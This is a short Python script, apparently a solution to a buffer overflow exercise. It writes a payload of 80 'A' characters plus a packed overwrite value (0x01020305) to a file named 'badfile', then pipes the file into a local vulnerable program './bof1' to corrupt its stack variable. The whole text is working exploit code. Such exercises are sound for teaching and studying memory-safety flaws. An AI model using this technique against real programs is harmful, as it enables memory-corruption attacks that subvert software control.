import struct 
import os

buf_cookie = 80

atk_vector = "A"*buf_cookie
atk_vector += struct.pack('I', 0x01020305)
atk_vector += '\n'

f = open('badfile', 'w+')
f.write(atk_vector)
f.close()

os.system("cat {} | ./bof1".format('badfile'))
